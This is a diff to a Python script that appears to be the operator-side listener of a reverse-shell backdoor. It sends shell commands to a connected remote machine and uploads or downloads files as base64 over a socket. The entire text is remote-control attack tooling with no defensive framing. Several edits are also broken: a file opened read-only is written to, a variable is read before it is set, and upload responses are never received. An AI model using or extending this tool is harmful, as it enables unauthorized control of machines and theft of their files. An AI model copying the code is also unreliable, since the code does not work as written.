@@ -1,6 +1,6 @@
 import socket
 import optparse
-import json
+import simplejson
 import base64
 
 
@@ -28,21 +28,25 @@ class MainMate:
         print(f"Connected to {self.ipg} on {port} \n\nListening..\n")
 
     def send_j(self, pack):
-        package = json.dumps(pack)
-        self.connection.send(package)
+        package = simplejson.dumps(pack)
+        self.connection.send(package.encode("utf-8"))
 
     def recv_j(self):
         data = ""
-
         while True:
             try:
-                data += self.connection.recv(2048)
-                return json.loads(data)
+                data += self.connection.recv(2048).decode("utf-8")
+                return simplejson.loads(data)
             except ValueError:
                 continue
 
     @staticmethod
-    def saving(self, file, inc):
+    def down_func(file):
+        with open(file, "rb") as last:
+            return base64.b64encode(last.read())
+
+    @staticmethod
+    def saving(file, inc):
         with open(file, "rb") as writing:
             writing.write(base64.b64decode(inc))
             return f"{file} is downloaded"
@@ -50,18 +54,28 @@ class MainMate:
     def cmd_loop(self):
         while True:
             cmd_inp = input(f"{self.ipg}$ ").split(" ")
-            self.send_j(cmd_inp)
 
-            if cmd_inp[0] == "exit":
-                self.listener.close()
-                break
+            try:
+                if cmd_inp[0] == "exit":
+                    self.listener.close()
+                    break
 
-            elif cmd_inp[0] == "download":
-                cmd_out = self.saving(cmd_inp[1], cmd_out)
+                elif cmd_inp[0] == "upload":
+                    content = self.down_func(cmd_inp[1])
+                    cmd_inp.append(str(content))
 
-            else:
-                cmd_out = self.recv_j()
-                print(cmd_out)
+                    self.send_j(cmd_inp)
+
+                elif cmd_inp[0] == "download" and "Invalid command!" not in cmd_out:
+                    cmd_out = self.saving(cmd_inp[1], cmd_out)
+
+                else:
+                    cmd_out = self.recv_j()
+                    print(cmd_out)
+
+            except Exception:
+                cmd_out = "Error!"
+            print(cmd_out)
 
         self.listener.close()
 
